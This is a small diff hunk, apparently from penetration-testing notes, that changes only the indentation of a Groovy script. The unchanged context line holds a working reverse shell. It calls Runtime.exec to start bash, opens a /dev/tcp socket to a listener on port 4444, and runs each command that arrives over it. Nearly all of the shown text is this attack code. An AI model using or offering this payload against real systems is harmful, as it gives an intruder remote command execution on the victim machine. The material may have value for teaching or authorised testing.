@@ -38,4 +38,4 @@ This is a pretty obscure / esoteric method but there might be a chance you might
 
 	r = Runtime.getRuntime()
 	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/127.0.0.1/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-p.waitFor()
+	p.waitFor()
